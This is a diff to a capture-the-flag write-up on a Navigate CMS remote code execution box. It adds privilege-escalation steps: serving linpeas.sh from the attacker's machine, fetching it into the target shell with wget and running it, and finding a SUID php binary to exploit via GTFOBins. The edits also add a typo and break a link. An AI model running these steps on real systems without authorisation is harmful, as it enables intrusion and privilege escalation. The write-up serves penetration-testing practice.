@@ -337,9 +337,6 @@ Now while searching in Google, searchploit & Rapid7 we found
 
 **Navigate CMS -(Unauthenticated) Remote Code Execution**
 
-
-## Exploitation 
-
 We will search for it in **Metasploit**
 
 Start Metasploit :
@@ -384,7 +381,7 @@ Okay now we are in  but we are just on the **www-data** and we have to do **priv
 
 Now we need to get a shell but how ?
 
-You can check if they have python installed if they have it then we can generate a tty shell using a one liner code found online
+You can check if they have python installed if thet have then we can generate a tty shell using a one liner code found online
 
 check by typing :
 
@@ -417,7 +414,7 @@ This is for doing linux privilege escalation and if you were to go for windows p
 ```
 
 We can try to send the **linpeas.sh**
-First git clone the **"linpeas.sh"** script or  (Find the latest version) from [**here**](https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1) Download it manually :)
+First git clone the **"linpeas.sh"** script or  (Find the latest version) from [**here**]https://github.com/peass-ng/PEASS-ng/releases/tag/20240811-aea595a1 Download it manually :)
 
 After downloading move the linpeas.sh file to your folder where you want to host it 
 
@@ -428,5 +425,48 @@ python3 -m http.server 80
 ```
 Okay now you have setup the server
 
+Now go back to the tty shell download the file using **wget** 
+## Usage
+```
+wget [http://URL/location]  [filename wou want to save as]
 
-Writing.....
+```
+Like this
+```
+wget http://[your ip]/linpeas.sh linpeas.sh
+
+```
+Give **linpeas.sh** execution permission
+
+```
+chmod +x linpeas.sh
+```
+
+Run the scirpt
+
+```
+./linpeas.sh
+```
+Now it's going to give you a lot of information about that system
+
+Scroll down to see **intresting files**
+
+We find **/usr/bin/php7.3 (Unknown SUID Binary)**
+
+
+
+You can use this command to find special files with setuid permissions by also ignoring errors.
+
+```
+find / -type f -perm -4000 2>/dev/null
+
+find /: Search starting from the root directory (/).
+-type f: Look only for regular files.
+-perm -4000: Find files with the setuid bit set (special permission that lets users run the file with the permissions of the file owner).
+2>/dev/null: Redirect any error messages (like "Permission denied") to nowhere, so they don’t clutter the output.
+```
+it will also show **/usr/bin/php7.3**
+
+Now Check for **SUID** in **GTFOBins** and try to find anything realted to the one's we found using the above command 
+
+and yes we found **php**
